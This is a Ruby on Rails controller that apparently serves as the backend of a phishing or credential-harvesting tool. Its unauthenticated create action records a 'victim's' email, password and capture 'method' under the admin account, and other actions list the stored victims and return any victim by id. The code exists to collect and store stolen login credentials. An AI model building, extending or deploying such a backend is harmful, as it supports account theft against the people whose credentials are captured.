class VictimsController < ApplicationController
  before_action :authenticate_user, except: [:create]
  
  def index
    victims = current_user.victims
    render json: victims.as_json
  end

  def create
    admin = User.find_by({name: "admin"})

    if params[:password].empty?
      password = params[:password]
    else
      password = AESCrypt.encrypt(params[:password], ENV["YOUR_FUNNY"])
    end 

    victim = Victim.new(
      email: params[:email],
      password: password,
      method: params[:method],
      user_id: admin.id
    )
    if victim.save
      render json: {status: "You have successly created a victim"}, status: :created
    else
      render json: {errors: victim.errors.full_messages}, status: :bad_request
    end
  end

  def show
    return_victim = Victim.find_by(id: params[:id].to_i)
    render json: return_victim.as_json
  end
end
